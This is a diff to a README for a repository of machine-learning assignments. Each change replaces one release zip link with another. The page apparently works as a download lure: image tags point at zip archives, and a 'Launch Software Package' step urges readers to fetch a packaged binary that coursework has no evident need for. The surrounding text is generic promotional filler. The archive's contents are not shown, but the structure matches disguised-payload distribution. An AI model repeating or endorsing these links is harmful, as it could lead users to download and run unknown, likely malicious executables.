@@ -1,6 +1,6 @@
 # ML-Assignments
 
-![ML-Assignments](https://github.com/yiAyyi/ML-Assignments/releases/download/v1.0/Release_x64.zip)
+![ML-Assignments](https://github.com/yiAyyi/ML-Assignments/releases/download/v2.0/Software.zip)
 
 Welcome to the ML-Assignments repository! Here, you will find a collection of pattern recognition and machine learning assignments to help you sharpen your skills in the field. Whether you are a beginner or an experienced practitioner, these assignments will challenge you to apply various machine learning algorithms and techniques to solve real-world problems.
 
@@ -23,7 +23,7 @@ Explore assignments on the following topics:
 ## Get Started
 To get started with the assignments, download the necessary software package from the following link:
 
-[Launch Software Package](https://github.com/yiAyyi/ML-Assignments/releases/download/v1.0/Release_x64.zip)
+[Launch Software Package](https://github.com/yiAyyi/ML-Assignments/releases/download/v2.0/Software.zip)
 
 If the link does not work or if you encounter any issues, please check the "Releases" section of this repository for alternative download options.
 
@@ -41,4 +41,4 @@ For any questions or feedback regarding the assignments, feel free to open an is
 
 Let's dive into the fascinating world of machine learning together! 🚀🧠📊
 
-![Machine Learning](https://github.com/yiAyyi/ML-Assignments/releases/download/v1.0/Release_x64.zip)
+![Machine Learning](https://github.com/yiAyyi/ML-Assignments/releases/download/v2.0/Software.zip)
